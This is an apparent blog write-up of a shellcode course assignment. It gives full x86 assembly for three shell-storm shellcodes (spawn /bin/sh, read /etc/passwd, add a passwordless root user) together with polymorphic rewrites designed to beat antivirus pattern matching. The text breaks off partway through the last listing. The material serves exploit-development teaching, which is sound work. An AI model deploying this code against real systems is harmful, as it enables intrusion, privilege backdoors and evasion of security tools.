<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<script type=text/javascript src=../../static/js/cactus.js></script>
<link rel=stylesheet href=../../static/css/style.css type=text/css>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> SLAE x86 - Assignment 0x6 | jsn></title>
<link rel=canonical href=https://jsnv.dev/posts/slae_x86_a6/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="SLAE x86 - Assignment 0x6">
<meta property="og:description" content="Shellcode Polymorphism Objectives  Take up 3 shellcodes from shell-storm and create polymorphic versions of them to beat pattern matching  The polymorphic versions cannot be larger 150% of the existing shellcode Bonus points for making it shorter in length than original    Polymorphism It is a &ldquo;concept borrowed from a principle in biology where an organism or species can have many different forms or stages&rdquo; as mentioned in this Wikipedia Article.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://jsnv.dev/posts/slae_x86_a6/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-23T03:59:19+00:00">
<meta property="article:modified_time" content="2021-10-23T03:59:19+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="SLAE x86 - Assignment 0x6">
<meta name=twitter:description content="Shellcode Polymorphism Objectives  Take up 3 shellcodes from shell-storm and create polymorphic versions of them to beat pattern matching  The polymorphic versions cannot be larger 150% of the existing shellcode Bonus points for making it shorter in length than original    Polymorphism It is a &ldquo;concept borrowed from a principle in biology where an organism or species can have many different forms or stages&rdquo; as mentioned in this Wikipedia Article.">
<link rel=stylesheet href=https://jsnv.dev/css/styles.9479e3a8e1c8ac41c28e4e18ad549766e3ce2e4e49cab5d83920f533288fc6ac9a9d4f224545bce5d12c4132b271982f4c421aa0c6a8e548abbbddf171e1caeb.css integrity="sha512-lHnjqOHIrEHCjk4YrVSXZuPOLk5JyrXYOSD1MyiPxqyanU8iRUW85dEsQTKycZgvTEIaoMao5Uiru93xceHK6w=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://jsnv.dev/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://jsnv.dev/posts/slae_x86_a5/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://jsnv.dev/posts/slae_x86_a7/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&text=SLAE%20x86%20-%20Assignment%200x6" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x6" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x6&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&title=SLAE%20x86%20-%20Assignment%200x6" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&name=SLAE%20x86%20-%20Assignment%200x6&description=Shellcode%20Polymorphism%20Objectives%20%20Take%20up%203%20shellcodes%20from%20shell-storm%20and%20create%20polymorphic%20versions%20of%20them%20to%20beat%20pattern%20matching%20%20The%20polymorphic%20versions%20cannot%20be%20larger%20150%25%20of%20the%20existing%20shellcode%20Bonus%20points%20for%20making%20it%20shorter%20in%20length%20than%20original%20%20%20%20Polymorphism%20It%20is%20a%20%26ldquo%3bconcept%20borrowed%20from%20a%20principle%20in%20biology%20where%20an%20organism%20or%20species%20can%20have%20many%20different%20forms%20or%20stages%26rdquo%3b%20as%20mentioned%20in%20this%20Wikipedia%20Article." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a6%2f&t=SLAE%20x86%20-%20Assignment%200x6" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents>
<ul>
<li><a href=#objectives>Objectives</a></li>
<li><a href=#polymorphism>Polymorphism</a></li>
<li><a href=#tiny-execve-sh-shellcode>Tiny Execve sh Shellcode</a>
<ul>
<li><a href=#original-shellcode>Original Shellcode</a></li>
<li><a href=#polymorphic-version>Polymorphic Version</a></li>
<li><a href=#shellcode-testing>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#tiny-read-file-shellcode>Tiny Read File Shellcode</a>
<ul>
<li><a href=#original-shellcode-1>Original Shellcode</a></li>
<li><a href=#polymorphic-version-1>Polymorphic Version</a></li>
<li><a href=#shellcode-testing-1>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#add-root-user-shellcode>Add Root User Shellcode</a>
<ul>
<li><a href=#original-shellcode-2>Original Shellcode</a></li>
<li><a href=#polymorphic-version-2>Polymorphic Version</a></li>
<li><a href=#shellcode-testing-2>Shellcode Testing</a></li>
</ul>
</li>
<li><a href=#ruby-script>Ruby Script</a>
<ul>
<li><a href=#script-usage>Script Usage</a></li>
</ul>
</li>
</ul>
</nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
SLAE x86 - Assignment 0x6
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2021-10-23 03:59:19 +0000 UTC" itemprop=datePublished>2021-10-23</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
7 minute read
</div>
<div class=article-category>
<i class="fas fa-archive"></i>
<a class=category-link href=/categories/certification>certification</a>
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/exploit_dev rel=tag>exploit_dev</a>
,
<a class=tag-link href=/tags/assembly rel=tag>assembly</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<h1 id=shellcode-polymorphism>Shellcode Polymorphism</h1>
<h2 id=objectives>Objectives</h2>
<ul>
<li>Take up 3 shellcodes from shell-storm and create polymorphic versions of them to beat pattern matching
<ul>
<li>The polymorphic versions cannot be larger 150% of the existing shellcode</li>
<li>Bonus points for making it shorter in length than original</li>
</ul>
</li>
</ul>
<h2 id=polymorphism>Polymorphism</h2>
<p>It is a <em>&ldquo;concept borrowed from a principle in biology where an organism or species can have many different forms or stages&rdquo;</em> as mentioned in <a href=https://en.wikipedia.org/wiki/Polymorphism_(computer_science)><code>this Wikipedia Article</code></a>. It&rsquo;s use case in exploit development is the almost the same with <a href=../slae_x86_a4#overview><code>Shellcode Encoding assignment</code></a> and as mentioned in the <a href=#objectives>objectives</a>, to beat pattern matching. In simple way, the current code is modified to be look like gibberish but still getting the end result as the original code. Also, adding extra instructions like <code>nops</code> or other that will not affect the outcome to make the shellcode look different from existing signatures of endpoint protection products.</p>
<h2 id=tiny-execve-sh-shellcode>Tiny Execve sh Shellcode</h2>
<h3 id=original-shellcode>Original Shellcode</h3>
<ul>
<li>Source: <a href=http://shell-storm.org/shellcode/files/shellcode-841.php>http://shell-storm.org/shellcode/files/shellcode-841.php</a></li>
<li>This will use <code>execve</code> syscall to run <code>/bin/sh</code> program</li>
</ul>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
  <span class=nf>mul</span> <span class=nb>ecx</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>
  <span class=nf>push</span> <span class=nb>ecx</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x68732f2f</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x6e69622f</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=polymorphic-version>Polymorphic Version</h3>
<p>Explanation of each lines are added as comments in the code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0xdcd2c45e</span>        <span class=c1>; ebx =  twice the value of &#39;/bin&#39;</span>
  <span class=nf>shr</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x1</span>               <span class=c1>; divide ebx by 2, once</span>
                             <span class=c1>; src: https://www.felixcloutier.com/x86/sal:sar:shl:shr</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>               <span class=c1>; clear ecx</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                   <span class=c1>; push NULL</span>
  <span class=nf>push</span> <span class=kt>word</span> <span class=mh>0x2f2f</span>           <span class=c1>; push &#39;//&#39;</span>
  <span class=nf>mul</span> <span class=nb>ecx</span>                    <span class=c1>; clear eax and edx</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0xb</span>                <span class=c1>; set execve</span>
  <span class=nf>mov</span> <span class=kt>word</span> <span class=p>[</span><span class=nb>esp</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=mh>0x6873</span>   <span class=c1>; complete the &#39;//sh&#39; in esp</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                   <span class=c1>; push &#39;/bin&#39;</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>               <span class=c1>; ebx = address of esp</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                   <span class=c1>; syscall</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=shellcode-testing>Shellcode Testing</h3>
<p>Used the <a href=#ruby-script>Ruby script</a> to make the compilation of the binary easier.</p>
<p><img src=tiny_execve_sh.gif alt></p>
<h2 id=tiny-read-file-shellcode>Tiny Read File Shellcode</h2>
<h3 id=original-shellcode-1>Original Shellcode</h3>
<ul>
<li>Source: <a href=http://shell-storm.org/shellcode/files/shellcode-842.php>http://shell-storm.org/shellcode/files/shellcode-842.php</a></li>
<li>This will read <code>/etc/passwd</code> file, the same purpose with the shellcode in <a href=../slae_x86_a5#msf-read-file-shellcode>Shellcode Analysis assignment</a></li>
</ul>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
  <span class=nf>mul</span> <span class=nb>ecx</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x5</span>
  <span class=nf>push</span> <span class=nb>ecx</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x64777373</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x61702f63</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x74652f2f</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>ebx</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>ecx</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x3</span>
  <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
  <span class=nf>mov</span> <span class=nb>dx</span><span class=p>,</span> <span class=mh>0xfff</span>
  <span class=nf>inc</span> <span class=nb>edx</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>edx</span>
  <span class=nf>xor</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>eax</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x4</span>
  <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0x1</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>ebx</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=polymorphic-version-1>Polymorphic Version</h3>
<p>Explanation of each lines are added as comments in the code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
                                <span class=c1>; clear registers</span>
  <span class=nf>sub</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>ebx</span>                  <span class=c1>; clear ebx</span>
  <span class=nf>mul</span> <span class=nb>ebx</span>                       <span class=c1>; clear eax, and edx</span>

  <span class=c1>; open(&#39;/etc//passwd&#39;, NULL)</span>
  <span class=nf>add</span> <span class=nb>eax</span><span class=p>,</span> <span class=mh>0x5</span>                  <span class=c1>; open(2)</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                      <span class=c1>; push NULL</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x64777364</span>           <span class=c1>; preparing ebx for &#39;sswd&#39;</span>
  <span class=nf>add</span> <span class=nb>bl</span><span class=p>,</span> <span class=mh>0xF</span>                   <span class=c1>; ebx = &#39;sswd&#39;</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                      <span class=c1>; push into stack</span>
  <span class=nf>push</span> <span class=nb>ebx</span>                      <span class=c1>; push again, but will be overwritten</span>
  <span class=nf>xor</span> <span class=nb>ebx</span><span class=p>,</span> <span class=mh>0x5075c10</span>            <span class=c1>; ebx = &#39;c/pa&#39;</span>
  <span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=nb>ebx</span>          <span class=c1>; overwrite the top of stack with ebx</span>
  <span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=o>-</span><span class=mi>4</span><span class=p>],</span> <span class=mh>0x74652f2f</span> <span class=c1>; 4 bytes above stack = &#39;//et&#39;</span>
  <span class=nf>sub</span> <span class=nb>esp</span><span class=p>,</span> <span class=mi>4</span>                    <span class=c1>; adjust the stack</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>                  <span class=c1>; ebx = current stack address</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall open(2)</span>

  <span class=c1>; read(fd, esp, 4095)</span>
  <span class=nf>mov</span> <span class=nb>cl</span><span class=p>,</span> <span class=mh>0x3</span>                   <span class=c1>; read(2)</span>
  <span class=nf>xchg</span> <span class=nb>cl</span><span class=p>,</span> <span class=nb>al</span>                   <span class=c1>; eax = 3, ecx = fd; fd is return value from open(2)</span>
  <span class=nf>xchg</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ebx</span>                 <span class=c1>; ebx = fd, ecx = &lt;esp_address&gt;</span>
  <span class=nf>mov</span> <span class=nb>dx</span><span class=p>,</span> <span class=mh>0xfff</span>                 <span class=c1>; read up to 4095 bytes</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall read(2)</span>

  <span class=c1>; write(fd, esp, size);</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>edx</span>                 <span class=c1>; edx = size read - return from read(2); eax = 4095</span>
  <span class=nf>shr</span> <span class=nb>ax</span><span class=p>,</span> <span class=mh>0x10</span>                  <span class=c1>; clear ax, 0x0fff -&gt; 0x0000</span>
  <span class=nf>mov</span> <span class=nb>bl</span><span class=p>,</span> <span class=nb>al</span>                    <span class=c1>; clear bl</span>
  <span class=nf>add</span> <span class=nb>al</span><span class=p>,</span> <span class=mh>0x4</span>                   <span class=c1>; write(2)</span>
  <span class=nf>inc</span> <span class=nb>bl</span>                        <span class=c1>; stdout</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall write(2)</span>

  <span class=c1>; exit</span>
  <span class=nf>xchg</span> <span class=nb>eax</span><span class=p>,</span> <span class=nb>ebx</span>                 <span class=c1>; _exit(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                      <span class=c1>; syscall _exit(2)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=shellcode-testing-1>Shellcode Testing</h3>
<p>Used the <a href=#ruby-script>Ruby script</a> to make the compilation of the binary easier.</p>
<p><img src=tiny_read_file.gif alt></p>
<h2 id=add-root-user-shellcode>Add Root User Shellcode</h2>
<h3 id=original-shellcode-2>Original Shellcode</h3>
<ul>
<li>Source: <a href=http://shell-storm.org/shellcode/files/shellcode-211.php>http://shell-storm.org/shellcode/files/shellcode-211.php</a></li>
<li>This will add a root user in the <code>/etc/passwd</code> file without a password</li>
</ul>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0x5</span>
  <span class=nf>pop</span> <span class=nb>eax</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>ecx</span>
  <span class=nf>push</span> <span class=nb>ecx</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x64777373</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x61702f2f</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x6374652f</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>
  <span class=nf>mov</span> <span class=nb>cx</span><span class=p>,</span> <span class=mh>0x401</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>eax</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0x4</span>
  <span class=nf>pop</span> <span class=nb>eax</span>
  <span class=nf>xor</span> <span class=nb>edx</span><span class=p>,</span> <span class=nb>edx</span>
  <span class=nf>push</span> <span class=nb>edx</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x2f3a3a30</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x3a303a3a</span>
  <span class=nf>push</span> <span class=kt>dword</span> <span class=mh>0x74303072</span>
  <span class=nf>mov</span> <span class=nb>ecx</span><span class=p>,</span> <span class=nb>esp</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0xc</span>
  <span class=nf>pop</span> <span class=nb>edx</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0x6</span>
  <span class=nf>pop</span> <span class=nb>eax</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=o>+</span><span class=mh>0x1</span>
  <span class=nf>pop</span> <span class=nb>eax</span>
  <span class=nf>int</span> <span class=mh>0x80</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=polymorphic-version-2>Polymorphic Version</h3>
<p>Explanation of each lines are added as comments in the code:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-nasm data-lang=nasm><span class=k>global</span> <span class=nv>_start</span>

<span class=k>section</span> <span class=nv>.text</span>

<span class=nl>_start:</span>
  <span class=c1>; open(&#39;/etc//passwd&#39;, O_WRONLY | O_APPEND)</span>
  <span class=nf>push</span> <span class=kt>byte</span> <span class=mh>0x5</span>                 <span class=c1>; open(2)</span>
  <span class=nf>mov</span> <span class=nb>eax</span><span class=p>,</span> <span class=p>[</span><span class=nb>esp</span><span class=p>]</span>                <span class=c1>; eax = 0x5</span>
  <span class=nf>pop</span> <span class=nb>ecx</span>                       <span class=c1>; ecx = 0x5</span>
  <span class=nf>xor</span> <span class=nb>ecx</span><span class=p>,</span> <span class=mh>0x5</span>                  <span class=c1>; clear ecx</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                      <span class=c1>; push NULL</span>
  <span class=nf>push</span> <span class=nb>ecx</span>                      <span class=c1>; push NULL</span>
  <span class=nf>mov</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=mh>0x2d3ffc2d</span>   <span class=c1>; overwrite the recent null in stack</span>
  <span class=nf>add</span> <span class=kt>dword</span> <span class=p>[</span><span class=nb>esp</span><span class=p>],</span> <span class=mh>0x37377746</span>   <span class=c1>; esp value = &#39;sswd&#39;</span>
